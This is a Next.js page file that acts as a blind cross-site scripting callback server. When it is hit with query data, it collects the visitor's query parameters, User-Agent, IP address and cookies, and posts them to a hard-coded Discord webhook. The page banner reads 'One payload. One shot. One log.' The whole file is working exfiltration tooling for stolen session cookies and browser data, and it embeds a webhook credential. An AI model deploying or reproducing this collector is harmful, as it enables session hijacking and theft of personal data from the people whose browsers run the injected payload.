// pages/index.js

export async function getServerSideProps(context) {
  const data = context.query || {};
  const userAgent = context.req.headers['user-agent'] || 'Unknown';
  const ip = context.req.headers['x-forwarded-for'] || context.req.socket.remoteAddress || 'Unknown';
  const cookies = context.req.headers.cookie || 'No cookies';

  if (Object.keys(data).length > 0) {
    const content = `📢 Blind XSS Triggered!
Data: ${JSON.stringify(data, null, 2)}
User-Agent: ${userAgent}
IP: ${ip}
Cookies: ${cookies}`;

    try {
      await fetch("https://discord.com/api/webhooks/1399581817883070607/w92ptejt9nVYWwswLdqWnRzEFYqLmzZPahHakz_6Q5HG0vsauID65LU1bydMDhiAil7I", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ content }),
      });
    } catch (error) {
      console.error("Failed to send Discord webhook:", error);
    }
  }

  return {
    props: { dataSent: Object.keys(data).length > 0 },
  };
}

export default function Home({ dataSent }) {
  return (
    <div style={{
      display: "flex",
      height: "100vh",
      backgroundColor: "#0d0d0d",
      color: "#fff",
      justifyContent: "center",
      alignItems: "center",
      flexDirection: "column",
      fontFamily: "monospace",
      textAlign: "center"
    }}>
      <h1 style={{ fontSize: "2.5rem", marginBottom: "1rem" }}>
        One payload. One shot. One log.
      </h1>
      {dataSent ? (
        <p>📨 Payload received and logged.</p>
      ) : (
        <p>Waiting for payload...</p>
      )}
    </div>
  );
}
